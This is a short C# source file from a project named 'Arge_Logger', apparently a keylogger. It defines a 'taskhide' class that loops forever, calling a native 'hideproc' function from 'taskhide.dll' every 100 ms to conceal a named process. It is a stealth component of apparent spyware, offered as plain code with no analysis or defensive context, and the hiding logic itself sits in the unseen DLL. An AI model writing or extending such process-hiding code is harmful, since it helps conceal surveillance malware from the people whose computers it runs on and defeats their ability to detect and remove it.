using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace Arge_Logger
{
    class taskhide
    {
        public string proc;

        public taskhide(string p)
        {
            this.proc = p;
        }

        public void hide()
        {
            while (true)
            {
                hideproc(this.proc);
                System.Threading.Thread.Sleep(100);
            }
        }
        [DllImport("taskhide.dll")]
        public static extern bool hideproc(string proc); 
    }
}
